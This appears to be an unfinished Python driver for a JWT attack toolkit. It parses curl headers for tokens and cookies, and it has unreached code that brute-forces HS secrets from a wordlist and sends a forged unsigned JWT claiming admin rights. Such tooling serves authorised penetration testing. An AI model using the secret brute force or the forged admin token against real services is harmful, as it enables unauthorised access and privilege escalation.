## jwt hacking main, tests all JWT hacking activities

from jwtAlgos.bruteForceHS import hs_brute_force
from jwtHelper.jwtSplitter import jwt_reader
from jwtHelper.sendRequest import send_request
from jwtHelper.interpretCurl import curl_interpreter
import os
from dotenv import load_dotenv
import requests
import sys

load_dotenv()
brute_force_wordlist = os.getenv("BRUTE-FORCE-LIST-PATH")

with open(brute_force_wordlist, "r", encoding="utf-8") as f:
    wordlist = [line.strip() for line in f if line.strip()]


data = sys.stdin.read()

lines = data.split("\n")
headers = curl_interpreter.headers_from_curl(lines)


for header in headers:
    print(header)

jwts = curl_interpreter.find_jwt(headers)

print("---")
print(jwts)

header_dict = curl_interpreter.headers_to_dict(headers=headers)
cookies_dict = curl_interpreter.extract_cookies(headers=headers)
print("---")
print(header_dict)

print(cookies_dict)

quit()






alg = jwt_reader.get_jwt_alg(jwt)
testrun = hs_brute_force.brute_force_secret(jwt, wordlist)
print(testrun)

quit()

path = "example.com/test"
host = path.split("/")[0]

headers = {
    "Host": f"{host}",
    "Authorization": f"Bearer {jwt}"
}

cookies = {
    "EXAMPLE_AUTH_COOKIE": f"{jwt}"
}


new_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."


respcode = send_request.send_get_request(host, jwt, headers, cookies)

print(respcode)